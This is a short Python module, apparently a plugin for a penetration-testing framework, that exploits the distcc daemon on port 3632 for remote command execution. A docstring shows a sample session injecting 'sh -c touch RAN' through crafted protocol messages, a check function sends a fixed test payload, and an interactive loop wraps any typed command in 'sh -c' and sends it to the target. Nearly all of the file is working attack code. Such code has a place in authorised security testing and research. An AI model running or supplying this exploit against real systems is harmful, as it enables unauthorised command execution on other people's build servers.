"""
>>> args = ["sh", "-c", "touch RAN", "#", "-c", "main.c", "-o", "main.o"]
>>> res = "DIST00000001" + "ARGC%.8d" % len(args)
>>> for i in args:
...     res += "ARGV%.8d%s" % (len(i), i)
...
>>> sock = socket.socket()
>>> sock.connect(("192.168.1.78", 3632))
>>> sock.send(res.encode('utf-8'))
150
>>> sock.send("DOTI0000000AOOOOOOOOOO\n".encode('utf-8'))
23
>>> sock.recv(2014)
b'DONE00000001STAT00000000SERR00000000SOUT00000000DOTO00000000'
"""

import socket

def check(target, port):
    s = socket.socket()
    s.connect((target, port))
    payload = "DIST00000001ARGC00000008ARGV00000002shARGV00000002-cARGV00000000ARGV00000001#ARGV00000002-cARGV00000006main.cARGV00000002-oARGV00000006main.o"
    sucess = b"DONE00000001STAT00000000SERR00000000SOUT00000000DOTO00000000"
    s.send(payload.encode('utf-8'))
    rand = ''.join([chr(x) for x in range(0,11)]).encode('utf-8')
    s.send("DOTI0000000A%s\n".encode('utf-8') % (rand))
    if s.recv(1024) == sucess:
        return True
    else:
        return False

def exploit(args, port, reverse_handler):
    if check(args.target, port) != True:
        print("    \033[1;31m[-]\033[00m Exploit failed... target not vulerable")
        return
    print("    \033[1;31m-\033[00m exploit will provide limited command execution")
    while True:
        try:
            cmd = input("    cmd: ")
            cmd_args = ["sh", "-c", cmd, "#", "-c", "main.c", "-o", "main.o"]
            res = "DIST00000001" + "ARGC%.8d" % len(cmd_args)
            for i in cmd_args:
                    res += "ARGV%.8d%s" % (len(i), i)
            sock = socket.socket()
            sock.connect((args.target, port))
            sock.send(res.encode('utf-8'))
            rand = ''.join([chr(x) for x in range(0,11)]).encode('utf-8')
            sock.send("DOTI0000000A%s\n".encode('utf-8') % (rand))
            resp = sock.recv(36636)
            if len(resp) == 0:
                print("    \033[1;31m!\033[00m cmd failed")
            else:
                print(resp)
        except KeyboardInterrupt:
            print(" ")
            return

def run(args, data, reverse_handler):
    print("\033[1;34m[*]\033[00m Attempting exploit: distcc_cmd_exec")
    exploit(args, 3632, reverse_handler)
